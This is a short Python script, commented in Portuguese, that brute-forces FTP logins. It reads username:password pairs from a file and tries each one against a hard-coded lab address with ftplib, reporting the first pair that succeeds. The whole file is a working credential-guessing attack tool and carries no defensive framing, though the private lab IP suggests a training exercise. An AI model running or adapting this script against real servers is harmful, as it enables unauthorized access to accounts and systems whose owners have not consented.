#!/usr/bin/python
# -*- coding: utf-8 -*-

import ftplib
import time


def bruteLogin(hostname, passwdFile):
    """ Funcao para tentativa de conexao  """

    # Abre o arquivo de usuarios e senhas
    pF = open(passwdFile, 'r')
    # Loopa todas as linhas do arquivo de usuarios e senhas
    for line in pF.readlines():
        # Aguarda 1 segundo
        time.sleep(1)
        # Separa o usuario da senha, separados por :
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')

        print("[+] Trying: %s/%s" % (userName, passWord))
        try:
            # Cria um objeto de ftp para conexao
            ftp = ftplib.FTP(hostname)
            # Tenta logar via ftp usando os parametros informados
            ftp.login(userName, passWord)
            print('\n[*] %s FTP Logon Succeeded: %s/%s' % (str(hostname), userName, passWord))
            # Fecha a conexao via FTP
            ftp.quit()
            return (userName, passWord)
        except:
            pass
    # Se nao conseguiu conexao retorna erro
    print('\n[-] Could not brute force FTP credentials.')
    return (None, None)


# Parametros para conexao no host alvo
host = '192.168.56.107'
passwdFile = 'userpass.txt'
# Chama a funcao que tentar logar no host alvo
bruteLogin(host, passwdFile)
